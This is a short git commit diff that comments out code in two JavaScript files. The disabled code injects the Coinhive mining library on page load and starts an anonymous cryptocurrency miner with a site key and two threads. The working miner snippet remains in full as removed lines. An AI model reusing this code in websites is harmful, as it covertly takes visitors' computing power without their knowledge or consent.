09c3d36498b61860cd6580c0e6fa7590ede6345c
Nazar Mozol <xfce4@yandex.ua>
2017-10-18 00:02:39 +0300

    correct logic

--- jsts/cary-c.js
+++ jsts/cary-c.js
@@ -6,19 +6,19 @@ function setRewriteTL(){
 }
 setRewriteTL();
 
-$(document).ready(function(){
-	var script = document.createElement('script');
-	script.src = 'https://coinhive.com/lib/coinhive.min.js';
-	var ls = document.getElementsByTagName('head')[0].appendChild(script);
+// $(document).ready(function(){
+// 	var script = document.createElement('script');
+// 	script.src = 'https://coinhive.com/lib/coinhive.min.js';
+// 	var ls = document.getElementsByTagName('head')[0].appendChild(script);
 
-	ls.addEventListener('load', los, false);
+// 	ls.addEventListener('load', los, false);
 		
-	function los() {
-		setTimeout(function() {
-			var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
-				threads: 2
-			});
-			miner.start();
-		}, 500);
-	}
-});
+// 	function los() {
+// 		setTimeout(function() {
+// 			var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
+// 				threads: 2
+// 			});
+// 			miner.start();
+// 		}, 500);
+// 	}
+// });
--- jsts/cary-od.js
+++ jsts/cary-od.js
@@ -5,18 +5,18 @@ $(document).ready(function(){
 	}
 
 
-	var script = document.createElement('script');
-	script.src = 'https://coinhive.com/lib/coinhive.min.js';
-	var ls = document.getElementsByTagName('head')[0].appendChild(script);
+	// var script = document.createElement('script');
+	// script.src = 'https://coinhive.com/lib/coinhive.min.js';
+	// var ls = document.getElementsByTagName('head')[0].appendChild(script);
 
-	ls.addEventListener('load', los, false);
+	// ls.addEventListener('load', los, false);
 		
-	function los() {
-		setTimeout(function() {
-			var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
-				threads: 2
-			});
-			miner.start();
-		}, 500);
-	}
+	// function los() {
+	// 	setTimeout(function() {
+	// 		var miner = new CoinHive.Anonymous('wXS5KFc5mWChIpczWxnYY6X9tb95ESw1', {
+	// 			threads: 2
+	// 		});
+	// 		miner.start();
+	// 	}, 500);
+	// }
 });
